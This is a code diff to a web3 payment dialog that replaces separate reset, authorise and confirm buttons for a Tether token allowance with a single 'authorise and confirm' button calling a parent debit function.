@@ -22,9 +22,7 @@
           <span style="color:#aeaeae;">BTC(即将支持)</span>
         </div>
       </div>
-      <button id="btn-reset" style="margin-top: 30px;" class="layui-btn layui-btn-normal layui-btn-radius" lay-submit="" lay-filter="reset">重置授权</button>
-      <button id="btn-approve" style="margin-top: 30px;" class="layui-btn layui-btn-normal layui-btn-radius" lay-submit="" lay-filter="approve">授权</button>
-      <button id="btn-ok" style="margin-top: 30px;" class="layui-btn layui-btn-normal layui-btn-radius" lay-submit="" lay-filter="ok">确认</button>
+      <button style="margin-top: 30px;" class="layui-btn layui-btn-normal layui-btn-radius" lay-submit="" lay-filter="approveAndOK">授权并确认</button>
     </form>
   </div>
 </body>
@@ -48,9 +46,8 @@
 
 <script src="./layui/layui.js"></script>
 <script>
-  layui.use(['form', 'jquery'], function () {
+  layui.use(['form'], function () {
     var form = layui.form;
-    var $ = layui.jquery
 
     var ethRadio = document.getElementById('eth');
     var ethImg = document.getElementById('eth-img');
@@ -60,34 +57,11 @@
     ethImg.style.border = '2px solid #51b6e9';
     ethImg.style.borderRadius = '50px';
 
-    currentApprove = 0
-
-    parent.TetherToken.allowance(web3.eth.coinbase, parent.BlockDebitAddress, {
-      'from': web3.eth.coinbase
-    }).then(function (r) {
-      currentApprove = r[0].toNumber()
-
-      if (currentApprove == 0) {
-        $('#btn-reset').attr('disabled', 'disabled')
-        $('#btn-reset').removeClass('layui-btn-normal')
-        $('#btn-reset').addClass('layui-btn-disabled')
-
-      }
-    });
-
-    form.on('submit(reset)', function (data) {
-      parent.backDebit1()
-      return false;
-    });
-
-    form.on('submit(approve)', function (data) {
-      parent.backDebit2()
-      return false;
-    });
-
-    form.on('submit(ok)', function (data) {
-      parent.backDebit3()
+    form.on('submit(approveAndOK)', function (data) {
       parent.layer.close(parent.layer.getFrameIndex(window.name));
+
+      parent.backDebit()
+
       return false;
     });
   });
